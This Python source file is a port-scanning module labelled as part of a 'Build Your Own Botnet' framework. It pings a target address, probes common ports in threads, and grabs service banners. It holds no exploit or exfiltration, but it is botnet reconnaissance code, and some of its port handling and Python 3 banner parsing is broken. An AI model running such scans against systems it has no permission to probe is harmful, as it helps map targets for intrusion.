#!/usr/bin/python
# -*- coding: utf-8 -*-
'Port Scanner (Build Your Own Botnet)'

# standard libarary
import os
import sys
import json
import socket
if sys.version_info[0] > 2:
    from queue import Queue
else:
    from Queue import Queue
import subprocess

# utilities
from util import *

# globals
packages = []
platforms = ['win32','linux2','darwin']
results = {}
threads = {}
targets = []
tasks = Queue()
usage = 'portscanner [target]'
desciription = """
Scan a target IP/subnet for open ports and grab any service banners
"""

ports = {
  "666": {
    "protocol": "doom", 
    "service": "#Doom Id Software"
  }, 
  "1512": {
    "protocol": "wins", 
    "service": "#Microsoft Windows Internet Name Service"
  }, 
  "137": {
    "protocol": "netbios-ns", 
    "service": "nbname #NETBIOS Name Service"
  }, 
  "135": {
    "protocol": "epmap", 
    "service": "loc-srv #DCE endpoint resolution"
  }, 
  "139": {
    "protocol": "netbios-ssn", 
    "service": "nbsession #NETBIOS Session Service"
  }, 
  "3389": {
    "protocol": "ms-wbt-server", 
    "service": "#MS WBT Server"
  }, 
  "2525": {
    "protocol": "ms-v-worlds", 
    "service": "#Microsoft V-Worlds"
  }, 
  "25": {
    "protocol": "smtp", 
    "service": "mail #Simple Mail Transfer Protocol"
  }, 
  "691": {
    "protocol": "msexch-routing", 
    "service": "#MS Exchange Routing"
  }, 
  "20": {
    "protocol": "ftp-data", 
    "service": "#FTP, data"
  }, 
  "21": {
    "protocol": "ftp", 
    "service": "#FTP. control"
  }, 
  "22": {
    "protocol": "ssh", 
    "service": "#SSH Remote Login Protocol"
  }, 
  "23": {
    "protocol": "telnet", 
    "service": ""
  }, 
  "2869": {
    "protocol": "icslap", 
    "service": ""
  }, 
  "3126": {
    "protocol": "ms-dotnetster", 
    "service": "#Microsoft .NET ster port"
  }, 
  "2383": {
    "protocol": "ms-olap4", 
    "service": "#Microsoft OLAP 4"
  }, 
  "1944": {
    "protocol": "close-combat", 
    "service": ""
  }, 
  "543": {
    "protocol": "klogin", 
    "service": "#Kerberos login"
  }, 
  "540": {
    "protocol": "uucp", 
    "service": "uucpd"
  }, 
  "546": {
    "protocol": "dhcpv6-client", 
    "service": "#DHCPv6 Client"
  }, 
  "547": {
    "protocol": "dhcpv6-server", 
    "service": "#DHCPv6 Server"
  }, 
  "544": {
    "protocol": "kshell", 
    "service": "krcmd #Kerberos remote shell"
  }, 
  "47624": {
    "protocol": "directplaysrvr", 
    "service": "#Direct Play Server"
  }, 
  "548": {
    "protocol": "afpovertcp", 
    "service": "#AFP over TCP"
  }, 
  "349": {
    "protocol": "mftp", 
    "service": ""
  }, 
  "995": {
    "protocol": "pop3s", 
    "service": "spop3 #pop3 protocol over TLS/SSL (was spop3)"
  }, 
  "994": {
    "protocol": "ircs", 
    "service": "#IRC protocol over TLS/SSL"
  }, 
  "2460": {
    "protocol": "ms-theater", 
    "service": ""
  }, 
  "990": {
    "protocol": "ftps", 
    "service": "#FTP control, over TLS/SSL"
  }, 
  "993": {
    "protocol": "imaps", 
    "service": "#IMAP4 protocol over TLS/SSL"
  }, 
  "992": {
    "protocol": "telnets", 
    "service": "#Telnet protocol over TLS/SSL"
  }, 
  "1155": {
    "protocol": "nfa", 
    "service": "#Network File Access"
  }, 
  "2704": {
    "protocol": "sms-remctrl", 
    "service": "#SMS REMCTRL"
  }, 
  "2701": {
    "protocol": "sms-rcinfo", 
    "service": "#SMS RCINFO"
  }, 
  "2703": {
    "protocol": "sms-chat", 
    "service": "#SMS CHAT"
  }, 
  "2702": {
    "protocol": "sms-xfer", 
    "service": "#SMS XFER"
  }, 
  "3132": {
    "protocol": "ms-rule-engine", 
    "service": "#Microsoft Business Rule Engine Update Service"
  }, 
  "5679": {
    "protocol": "dccm", 
    "service": "#Direct Cable Connect Manager"
  }, 
  "53": {
    "protocol": "domain", 
    "service": "#Domain Name Server"
  }, 
  "2394": {
    "protocol": "ms-olap2", 
    "service": "#Microsoft OLAP 2"
  }, 
  "532": {
    "protocol": "netnews", 
    "service": "readnews"
  }, 
  "531": {
    "protocol": "conference", 
    "service": "chat"
  }, 
  "530": {
    "protocol": "courier", 
    "service": "rpc"
  }, 
  "593": {
    "protocol": "http-rpc-epmap", 
    "service": "#HTTP RPC Ep Map"
  }, 
  "989": {
    "protocol": "ftps-data", 
    "service": "#FTP data, over TLS/SSL"
  }, 
  "3776": {
    "protocol": "dvcprov-port", 
    "service": "#Device Provisioning Port"
  }, 
  "194": {
    "protocol": "irc", 
    "service": "#Internet Relay Chat Protocol"
  }, 
  "88": {
    "protocol": "kerberos", 
    "service": "krb5 kerberos-sec #Kerberos"
  }, 
  "111": {
    "protocol": "sunrpc", 
    "service": "rpcbind portmap #SUN Remote Procedure Call"
  }, 
  "110": {
    "protocol": "pop3", 
    "service": "#Post Office Protocol - Version 3"
  }, 
  "113": {
    "protocol": "auth", 
    "service": "ident tap #Identification Protocol"
  }, 
  "80": {
    "protocol": "http", 
    "service": "www www-http #World Wide Web"
  }, 
  "81": {
    "protocol": "hosts2-ns", 
    "service": "#HOSTS2 Name Server"
  }, 
  "119": {
    "protocol": "nntp", 
    "service": "usenet #Network News Transfer Protocol"
  }, 
  "118": {
    "protocol": "sqlserv", 
    "service": "#SQL Services"
  }, 
  "522": {
    "protocol": "ulp", 
    "service": ""
  }, 
  "1711": {
    "protocol": "pptconference", 
    "service": ""
  }, 
  "3020": {
    "protocol": "cifs", 
    "service": ""
  }, 
  "1524": {
    "protocol": "ingreslock", 
    "service": "ingres"
  }, 
  "1270": {
    "protocol": "opsmgr", 
    "service": "#Microsoft Operations Manager"
  }, 
  "526": {
    "protocol": "tempo", 
    "service": "newdate"
  }, 
  "2382": {
    "protocol": "ms-olap3", 
    "service": "#Microsoft OLAP 3"
  }, 
  "520": {
    "protocol": "efs", 
    "service": "#Extended File Name Server"
  }, 
  "2177": {
    "protocol": "qwave", 
    "service": "#QWAVE"
  }, 
  "7": {
    "protocol": "echo", 
    "service": ""
  }, 
  "529": {
    "protocol": "irc-serv", 
    "service": ""
  }, 
  "2393": {
    "protocol": "ms-olap1", 
    "service": "#Microsoft OLAP 1"
  }, 
  "3847": {
    "protocol": "msfw-control", 
    "service": "#Microsoft Firewall Control"
  }, 
  "3587": {
    "protocol": "p2pgroup", 
    "service": "#Peer to Peer Grouping"
  }, 
  "443": {
    "protocol": "https", 
    "service": "MCom #HTTP over TLS/SSL"
  }, 
  "7680": {
    "protocol": "ms-do", 
    "service": "#Microsoft Delivery Optimization"
  }, 
  "445": {
    "protocol": "microsoft-ds", 
    "service": ""
  }, 
  "109": {
    "protocol": "pop2", 
    "service": "postoffice #Post Office Protocol - Version 2"
  }, 
  "102": {
    "protocol": "iso-tsap", 
    "service": "#ISO-TSAP Class 0"
  }, 
  "389": {
    "protocol": "ldap", 
    "service": "#Lightweight Directory Access Protocol"
  }, 
  "101": {
    "protocol": "hostname", 
    "service": "hostnames #NIC Host Name Server"
  }, 
  "4350": {
    "protocol": "net-device", 
    "service": "#Net Device"
  }, 
  "107": {
    "protocol": "rtelnet", 
    "service": "#Remote Telnet Service"
  }, 
  "1434": {
    "protocol": "ms-sql-m", 
    "service": "#Microsoft-SQL-Monitor"
  }, 
  "1433": {
    "protocol": "ms-sql-s", 
    "service": "#Microsoft-SQL-Server"
  }, 
  "37": {
    "protocol": "time", 
    "service": "timserver"
  }, 
  "1723": {
    "protocol": "pptp", 
    "service": "#Point-to-point tunnelling protocol"
  }, 
  "6073": {
    "protocol": "directplay8", 
    "service": "#DirectPlay8"
  }, 
  "513": {
    "protocol": "login", 
    "service": "#Remote Login"
  }, 
  "512": {
    "protocol": "exec", 
    "service": "#Remote Process Execution"
  }, 
  "515": {
    "protocol": "printer", 
    "service": "spooler"
  }, 
  "514": {
    "protocol": "cmd", 
    "service": "shell"
  }, 
  "3935": {
    "protocol": "sdp-portmapper", 
    "service": "#SDP Port Mapper Protocol"
  }, 
  "9535": {
    "protocol": "man", 
    "service": "#Remote Man Server"
  }, 
  "3269": {
    "protocol": "msft-gc-ssl", 
    "service": "#Microsoft Global Catalog with LDAP/SSL"
  }, 
  "179": {
    "protocol": "bgp", 
    "service": "#Border Gateway Protocol"
  }, 
  "3268": {
    "protocol": "msft-gc", 
    "service": "#Microsoft Global Catalog"
  }, 
  "1900": {
    "protocol": "ssdp", 
    "service": ""
  }, 
  "170": {
    "protocol": "print-srv", 
    "service": "#Network PostScript"
  }, 
  "554": {
    "protocol": "rtsp", 
    "service": "#Real Time Stream Control Protocol"
  }, 
  "2053": {
    "protocol": "knetd", 
    "service": "#Kerberos de-multiplexor"
  }, 
  "1731": {
    "protocol": "msiccp", 
    "service": ""
  }, 
  "158": {
    "protocol": "pcmail-srv", 
    "service": "#PCMail Server"
  }, 
  "507": {
    "protocol": "crs", 
    "service": "#Content Replication System"
  }, 
  "1034": {
    "protocol": "activesync", 
    "service": "#ActiveSync Notifications"
  }, 
  "568": {
    "protocol": "ms-shuttle", 
    "service": "#Microsoft shuttle"
  }, 
  "569": {
    "protocol": "ms-rome", 
    "service": "#Microsoft rome"
  }, 
  "636": {
    "protocol": "ldaps", 
    "service": "sldap #LDAP over TLS/SSL"
  }, 
  "464": {
    "protocol": "kpasswd", 
    "service": "# Kerberos (v5)"
  }, 
  "563": {
    "protocol": "nntps", 
    "service": "snntp #NNTP over TLS/SSL"
  }, 
  "565": {
    "protocol": "whoami", 
    "service": ""
  }, 
  "1863": {
    "protocol": "msnp", 
    "service": ""
  }, 
  "3074": {
    "protocol": "xbox", 
    "service": "#Microsoft Xbox game port"
  }, 
  "11": {
    "protocol": "systat", 
    "service": "users #Active users"
  }, 
  "13": {
    "protocol": "daytime", 
    "service": ""
  }, 
  "17": {
    "protocol": "qotd", 
    "service": "quote #Quote of the day"
  }, 
  "3882": {
    "protocol": "msdts1", 
    "service": "#DTS Service Port"
  }, 
  "19": {
    "protocol": "chargen", 
    "service": "ttytst source #Character generator"
  }, 
  "117": {
    "protocol": "uucp-path", 
    "service": ""
  }, 
  "1745": {
    "protocol": "remote-winsock", 
    "service": ""
  }, 
  "9753": {
    "protocol": "rasadv", 
    "service": ""
  }, 
  "2106": {
    "protocol": "mzap", 
    "service": "#Multicast-Scope Zone Announcement Protocol"
  }, 
  "1109": {
    "protocol": "kpop", 
    "service": "#Kerberos POP"
  }, 
  "150": {
    "protocol": "sql-net", 
    "service": ""
  }, 
  "156": {
    "protocol": "sqlsrv", 
    "service": ""
  }, 
  "749": {
    "protocol": "kerberos-adm", 
    "service": "#Kerberos administration"
  }, 
  "556": {
    "protocol": "remotefs", 
    "service": "rfs rfs_server"
  }, 
  "11320": {
    "protocol": "imip-channels", 
    "service": "#IMIP Channels Port"
  }, 
  "3535": {
    "protocol": "ms-la", 
    "service": "#Microsoft Class Server"
  }, 
  "5678": {
    "protocol": "rrac", 
    "service": "#Remote Replication Agent Connection"
  }, 
  "5357": {
    "protocol": "wsd", 
    "service": "#Web Services on devices"
  }, 
  "5355": {
    "protocol": "llmnr", 
    "service": "#LLMNR"
  }, 
  "3343": {
    "protocol": "ms-cluster-net", 
    "service": "#Microsoft Cluster Net"
  }, 
  "5720": {
    "protocol": "ms-licensing", 
    "service": "#Microsoft Licensing"
  }, 
  "42": {
    "protocol": "nameserver", 
    "service": "name #Host Name Server"
  }, 
  "43": {
    "protocol": "nicname", 
    "service": "whois"
  }, 
  "5358": {
    "protocol": "wsd", 
    "service": "#Web Services on devices"
  }, 
  "322": {
    "protocol": "rtsps", 
    "service": ""
  }, 
  "1110": {
    "protocol": "nfsd-status", 
    "service": "#Cluster status info"
  }, 
  "9": {
    "protocol": "discard", 
    "service": "sink null"
  }, 
  "1755": {
    "protocol": "ms-streaming", 
    "service": ""
  }, 
  "2504": {
    "protocol": "wlbs", 
    "service": "#Microsoft Windows Load Balancing Server"
  }, 
  "2725": {
    "protocol": "msolap-ptp2", 
    "service": "#MSOLAP PTP2"
  }, 
  "143": {
    "protocol": "imap", 
    "service": "imap4 #Internet Message Access Protocol"
  }, 
  "612": {
    "protocol": "hmmp-ind", 
    "service": "#HMMP Indication"
  }, 
  "613": {
    "protocol": "hmmp-op", 
    "service": "#HMMP Operation"
  }, 
  "4500": {
    "protocol": "ipsec-msft", 
    "service": "#Microsoft IPsec NAT-T"
  }, 
  "70": {
    "protocol": "gopher", 
    "service": ""
  }, 
  "3702": {
    "protocol": "ws-discovery", 
    "service": "#WS-Discovery"
  }, 
  "79": {
    "protocol": "finger", 
    "service": ""
  }, 
  "3544": {
    "protocol": "teredo", 
    "service": "#Teredo Port"
  }, 
  "3540": {
    "protocol": "pnrp-port", 
    "service": "#PNRP User Port"
  }, 
  "1801": {
    "protocol": "msmq", 
    "service": "#Microsoft Message Queue"
  }, 
  "2234": {
    "protocol": "directplay", 
    "service": "#DirectPlay"
  }, 
  "1607": {
    "protocol": "stt", 
    "service": ""
  }, 
  "1477": {
    "protocol": "ms-sna-server", 
    "service": ""
  }, 
  "1478": {
    "protocol": "ms-sna-base", 
    "service": ""
  }, 
  "800": {
    "protocol": "mdbs_daemon", 
    "service": ""
  },
  "3306": {
    "protocol": "mysql",
    "service": "#MySQL Database Server"
  }
}


def _ping(host):
    global results
    try:
        if host not in results:
            if subprocess.call("ping -{} 1 -W 90 {}".format('n' if os.name == 'nt' else 'c', host), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                results[host] = {}
                return True
            else:
                return False
        else:
            return True
    except Exception as e:
        log(str(e))
        return False


@threaded
def _threader():
    while True:
        global tasks
        try:
            method, task = tasks.get_nowait()
            if callable(method):
                _ = method(task)
            tasks.task_done()
        except:
            break


def _scan(target):
    global ports
    global results

    try:
        data = None
        host, port = target
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.0)
        sock.connect((str(host), int(port)))

        try:
            data = sock.recv(1024)
        except (socket.error, socket.timeout):
            pass

        sock.close()

        if data:
            data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])])
            data = data.splitlines()[0] if '\n' in data else str(data if len(str(data)) <= 80 else data[:77] + '...')
            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': data, 'state': 'open'}}
        else:
            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': ports[str(port)]['service'], 'state': 'open'}}

        results.get(host).update(item)

    except (socket.error, socket.timeout):
        pass
    except Exception as e:
        log("{} error: {}".format(_scan.__name__, str(e)))


def run(target='192.168.1.1', ports=[21,22,23,25,80,110,111,135,139,443,445,554,993,995,1433,1434,3306,3389,8000,8008,8080,8888]):
    """
    Run a portscan against a target hostname/IP address

    `Optional`
    :param str target: Valid IPv4 address
    :param list ports: Port numbers to scan on target host
    :returns: Results in a nested dictionary object in JSON format

    Returns onlne targets & open ports as key-value pairs in dictionary (JSON) object

    """
    global tasks
    global threads
    global results
    if not ipv4(target):
        raise ValueError("target is not a valid IPv4 address")
    if _ping(target):
        for port in ports:
            tasks.put_nowait((_scan, (target, port)))
        for i in range(1, tasks.qsize()):
            threads['portscan-%d' % i] = _threader()
        for t in threads:
            threads[t].join()
        return json.dumps(results[target])
    else:
        return "Target offline"

